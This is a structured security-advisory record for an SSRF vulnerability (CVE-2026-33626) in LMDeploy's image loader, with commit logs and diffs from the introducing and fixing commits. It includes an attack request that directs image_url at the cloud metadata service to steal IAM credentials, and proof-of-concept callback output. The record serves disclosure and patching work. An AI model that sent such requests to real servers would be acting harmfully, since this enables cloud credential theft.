# GHSA-6W67-HWM5-92MQ

repo: InternLM/lmdeploy

summary: LMDeploy has Server-Side Request Forgery (SSRF) via Vision-Language Image Loading

aliases: ['CVE-2026-33626']

severity: HIGH

evidence: file_history blamed_lines=0 files=['docs/en/conf.py', 'lmdeploy/pytorch/config.py']

intro: c677cdd5e88b29aeb52e9a45673560a7c5f1a8d9

intro_subject: Use pyupgrade and ruff to modernize LMDeploy Python Code (#4392)

intro_date: 2026-03-24T11:01:42+08:00

fix: 71d64a339edb901e9005358e0633fbbab367d626

affected: [
  {
    "package": {
      "ecosystem": "PyPI",
      "name": "lmdeploy"
    },
    "ranges": [
      {
        "type": "ECOSYSTEM",
        "events": [
          {
            "introduced": "0"
          },
          {
            "last_affected": "0.12.2"
          }
        ]
      }
    ]
  }
]

DETAILS:
## Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in LMDeploy's vision-language module. The `load_image()` function in `lmdeploy/vl/utils.py` fetches arbitrary URLs without validating internal/private IP addresses, allowing attackers to access cloud metadata services, internal networks, and sensitive resources.

## Affected Versions

- **Tested on:** main branch (2026-02-04)
- **Affected:** All versions prior to 0.12.3

## Vulnerable Code

**File:** `lmdeploy/vl/utils.py` (lines 64-67)
```python
def load_image(image_url: Union[str, Image.Image]) -> Image.Image:
    # ...
    if image_url.startswith('http'):
        response = requests.get(image_url, headers=headers, timeout=FETCH_TIMEOUT)
        # NO VALIDATION OF URL/IP BEFORE REQUEST
```

**Also affected:** `encode_image_base64()` function (lines 26-29)

## Root Cause

1. No validation of URLs before fetching
2. No blocklist for internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x, 192.168.x.x)
3. Server binds to `0.0.0.0` by default (api_server.py line 1393)
4. API keys disabled by default

## Attack Scenario

1. LMDeploy server deployed with vision-language model
2. Attacker sends request to `/v1/chat/completions` with malicious `image_url`:
```python
POST /v1/chat/completions
{
  "model": "internlm-xcomposer2",
  "messages": [{
    "role": "user", 
    "content": [
      {"type": "text", "text": "Describe this image"},
      {"type": "image_url", "image_url": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
    ]
  }]
}
```

3. Server fetches URL without validation
4. Attacker receives cloud credentials

## Proof of Concept

### Verified Exploitation Result
```
╔═══════════════════════════════════════════════════════════════════════╗
║  LMDeploy SSRF Vulnerability - Proof of Concept                       ║
╚═══════════════════════════════════════════════════════════════════════╝

[1] Starting callback server on port 8889...
[2] Attacker URL: http://127.0.0.1:8889/SSRF_PROOF?stolen_data=AWS_SECRET_KEY
[3] Calling vulnerable load_image() function...

======================================================================
[+] SSRF CALLBACK RECEIVED!
======================================================================
    Time:       2026-02-04 16:10:57
    Path:       /SSRF_PROOF?stolen_data=AWS_SECRET_KEY
    Client:     127.0.0.1:51154
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
===============================================================

REFS:
- WEB https://github.com/InternLM/lmdeploy/security/advisories/GHSA-6w67-hwm5-92mq
- ADVISORY https://nvd.nist.gov/vuln/detail/CVE-2026-33626
- WEB https://github.com/InternLM/lmdeploy/pull/4447
- WEB https://github.com/InternLM/lmdeploy/commit/71d64a339edb901e9005358e0633fbbab367d626
- PACKAGE https://github.com/InternLM/lmdeploy
- WEB https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3

INTRO_LOG:
c677cdd5e88b29aeb52e9a45673560a7c5f1a8d9
windreamer <windreamer@gmail.com>
2026-03-24T11:01:42+08:00
Use pyupgrade and ruff to modernize LMDeploy Python Code (#4392)

* fix: make ruff happy

* fix: autofix by ruff

* fix: manual fix for ruff

* fx: fix wrong moodification of ruff

* fix: fix typo according to copilot suggestions

* Fix docstrings: replace old-style typing constructs with modern Python 3.10+ equivalents (#2)

* Fix docstrings to Google style format aligned with type hints
* Fix docformatter lint: remove extra blank line before closing triple-quote in api.py
* Replace old-style Dict/List/Optional type references in docstrings
* Fix docstrings to conform with Google Style and use modern Python types
* Fix remaining outdated type hints in docstrings (List/Dict/Tuple/Union/Optional)
* Fix invalid dict() examples in vl/engine.py docstrings - use dict literals with code blocks

Co-authored-by: copilot-swe-agent[bot] <198982749+Copilot@users.noreply.github.com>
Co-authored-by: windreamer <572167+windreamer@users.noreply.github.com>

---------

Co-authored-by: Copilot <198982749+Copilot@users.noreply.github.com>
Co-authored-by: windreamer <572167+windreamer@users.noreply.github.com>


INTRO_STAT:
 .github/scripts/action_tools.py                    |  23 +-
 .github/scripts/doc_link_checker.py                |   2 +-
 .github/scripts/eval_base_config.py                |  52 ++--
 .github/scripts/eval_chat_config.py                | 152 ++++++----
 .github/scripts/eval_regression_base_models.py     |  76 +++--
 .github/scripts/eval_regression_chat_models.py     | 161 ++++++-----
 .github/scripts/eval_stable_object_config.py       |  40 +--
 .github/scripts/eval_stable_subject_config.py      |  30 +-
 .pre-commit-config.yaml                            |  22 +-
 autotest/interface/pipeline/test_pipeline_func.py  |  47 ++--
 .../restful/test_restful_chat_completions_v1.py    |  25 +-
 .../restful/test_restful_completions_v1.py         |   3 +-
 .../tools/chat/test_command_chat_hf_pytorch.py     |   9 +-
 .../tools/chat/test_command_chat_hf_turbomind.py   |  10 +-
 .../pipeline/test_pipeline_chat_pytorch_llm.py     |  11 +-
 .../pipeline/test_pipeline_chat_turbomind_llm.py   |  10 +-
 .../pipeline/test_pipeline_chat_turbomind_mllm.py  |   7 +-
 .../restful/test_restful_chat_hf_pytorch_llm.py    |  13 +-
 .../restful/test_restful_chat_hf_turbomind_llm.py  |  14 +-
 autotest/utils/config_utils.py                     |   2 +-
 autotest/utils/evaluate_utils.py                   |   4 +-
 autotest/utils/mp_log_utils.py                     |   2 +-
 autotest/utils/pipeline_chat.py                    |   8 +-
 autotest/utils/proxy_distributed_utils.py          |   2 +-
 autotest/u

INTRO_DIFF_OVERLAP:
diff --git a/docs/en/conf.py b/docs/en/conf.py
index 94ca2a4d..095173d3 100644
--- a/docs/en/conf.py
+++ b/docs/en/conf.py
@@ -25,7 +25,7 @@ from lmdeploy.serve.openai.api_server import router  # noqa: E402
 from lmdeploy.serve.proxy.proxy import app as proxy_server  # noqa: E402
 
 version_file = '../../lmdeploy/version.py'
-with open(version_file, 'r') as f:
+with open(version_file) as f:
     exec(compile(f.read(), version_file, 'exec'))
 __version__ = locals()['__version__']
 
diff --git a/lmdeploy/pytorch/config.py b/lmdeploy/pytorch/config.py
index 11bdff16..c979dcc9 100644
--- a/lmdeploy/pytorch/config.py
+++ b/lmdeploy/pytorch/config.py
@@ -1,7 +1,8 @@
 # Copyright (c) OpenMMLab. All rights reserved.
 import enum
+from collections.abc import Callable
 from dataclasses import dataclass, field
-from typing import Any, Callable, Dict, List, Literal, Optional, Tuple
+from typing import Any, Literal
 
 import torch
 
@@ -94,7 +95,7 @@ class CacheConfig:
     quant_policy: Literal[0, 4, 8] = 0
     device_type: str = 'cuda'
     num_state_caches: int = None
-    states_shapes: List[Tuple] = field(default_factory=list)
+    states_shapes: list[tuple] = field(default_factory=list)
 
     # reserved blocks for dummy inputs, init to 0 for unit test.
     num_reserved_gpu_blocks: int = 0
@@ -257,7 +258,7 @@ def _override_hf_config(hf_config: Any, key: str, hf_overrides):
         _overide_hf_config_cfg(hf_config, key, hf_overrides)
 
 
-def override_hf_config(hf_config: Any, hf_overrides: Dict[str, Any]):
+def override_hf_config(hf_config: Any, hf_overrides: dict[str, Any]):
     """Override HF config."""
     for k, v in hf_overrides.items():
         _override_hf_config(hf_config, k, v)
@@ -305,7 +306,7 @@ class ModelConfig:
     num_attention_heads: int
     num_key_value_heads: int
     bos_token_id: int
-    eos_token_id: List[int]
+    eos_token_id: list[int]
     head_dim: int
     k_head_dim: int = None
     v_head_dim: int = None
@@ -315,12 +316,12 @@ class ModelConfig:
     hf_config: Any = None
     llm_config: Any = None
     cogvlm_style: bool = False
-    custom_module_map: Dict[str, setattr] = None
+    custom_module_map: dict[str, setattr] = None
 
     # flash mla
     use_flash_mla: bool = False
     use_mla_fp8_cache: bool = False
-    mla_index_topk: Optional[int] = None
+    mla_index_topk: int | None = None
 
     # dllm
     model_paradigm: str = 'ar'
@@ -329,10 +330,10 @@ class ModelConfig:
 
     # Added for deepseekv3.2 nsa index
     # caches would be added after kv cache
-    cache_shapes: List[Tuple[List[int], torch.dtype]] = field(default_factory=list)
+    cache_shapes: list[tuple[list[int], torch.dtype]] = field(default_factory=list)
     # added for qwen3_next
     # could used for any SSM model.
-    states_shapes: List[Tuple[Tuple[int], torch.dtype]] = field(default_factory=list)
+    states_shapes: list[tuple[tuple[int], torch.dtype]] = field(default_factory=list)
 
     # check env for model-device combination
     check_env_func: Callable = _default_check_env
@@ -358,7 +359,7 @@ class ModelConfig:
         trust_remote_code: bool = True,
         dtype: str = 'auto',
         dist_config: DistConfig = None,
-        hf_overrides: Dict[str, Any] = None,
+        hf_overrides: dict[str, Any] = None,
         is_draft_model: bool = False,
         spec_method: str = None,
         model_format: str = None,
@@ -373,7 +374,7 @@ class ModelConfig:
                 models defined on the Hub in their own modeling files.
             dtype (str): user specified data type for model weights and
                 activations. Refer to `PyTorchEngineConfig` for details
-            hf_overrides (Dict[str, Any]): overrides for the HF config.
+            hf_overrides (dict[str, Any]): overrides for the HF config.
         """
         from transformers import AutoConfig
 
@@ -497,7 +498,7 @@ class MiscConfig:
     custom_module_map: str = None
     empty_init: bool = False
     model_format: str = None
-   

FIX_LOG:
71d64a339edb901e9005358e0633fbbab367d626
zxy <46674730+CUHKSZzxy@users.noreply.github.com>
2026-03-28T01:31:35+08:00
fix security issues (#4447)

* fix eval, safe url

* make copilot happy, fix ut

* ut allow redirects

* fix lint

* fix lint

* fix quant dtype error info

* block non-global ip


FIX_STAT:
 docs/en/conf.py                              |  2 +-
 lmdeploy/pytorch/config.py                   | 15 +++++++--
 lmdeploy/vl/media/connection.py              | 40 +++++++++++++++++++++--
 tests/test_lmdeploy/test_vl/test_safe_url.py | 47 ++++++++++++++++++++++++++++
 4 files changed, 97 insertions(+), 7 deletions(-)


FIX_DIFF_OVERLAP:
diff --git a/docs/en/conf.py b/docs/en/conf.py
index 095173d3..98938e38 100644
--- a/docs/en/conf.py
+++ b/docs/en/conf.py
@@ -164,7 +164,7 @@ html_theme_options = {
     #     {
     #         "name": "切换至简体中文",
     #         "url": "https://lmdeploy.readthedocs.io/en/latest",
-    #         "icon": "https://img.shields.io/badge/Doc-%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87-blue", # noqa: #501
+    #         "icon": "https://img.shields.io/badge/Doc-%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87-blue", # noqa: E501
     #         "type": "url",
     #     },
     # ],
diff --git a/lmdeploy/pytorch/config.py b/lmdeploy/pytorch/config.py
index fd1fb0af..e78b87e8 100644
--- a/lmdeploy/pytorch/config.py
+++ b/lmdeploy/pytorch/config.py
@@ -57,7 +57,13 @@ def _update_torch_dtype(config: 'ModelConfig', dtype: str, device_type: str = 'a
             torch_dtype = torch_dtype if torch_dtype in ['float16', 'bfloat16'] else 'float16'
         else:
             torch_dtype = dtype
-    config.dtype = eval(f'torch.{torch_dtype}')
+
+    resolved_dtype = getattr(torch, torch_dtype, None)
+    if not isinstance(resolved_dtype, torch.dtype):
+        raise ValueError(f'Invalid torch dtype "{torch_dtype}" resolved from model config; '
+                         'expected a torch.dtype attribute on torch.')
+    config.dtype = resolved_dtype
+
     return config
 
 
@@ -629,8 +635,11 @@ class QuantizationConfig:
         else:
             raise TypeError(f'Unsupported quant method: {quant_method}')
 
-        if quant_dtype is not None:
-            quant_dtype = eval(f'torch.{quant_dtype}')
+        resolved_quant_dtype = getattr(torch, quant_dtype, None)
+        if not isinstance(resolved_quant_dtype, torch.dtype):
+            raise ValueError(f'Invalid quant dtype "{quant_dtype}" resolved from model config; '
+                             'expected a torch.dtype attribute on torch.')
+        quant_dtype = resolved_quant_dtype
 
         ignored_layers = quant_config.get('ignored_layers', [])
         if not ignored_layers:


intro_is_ancestor_of_fix: True

tags_contain_intro_sample: []

tags_contain_fix_sample: []

tags_with_intro_not_fix_sample: []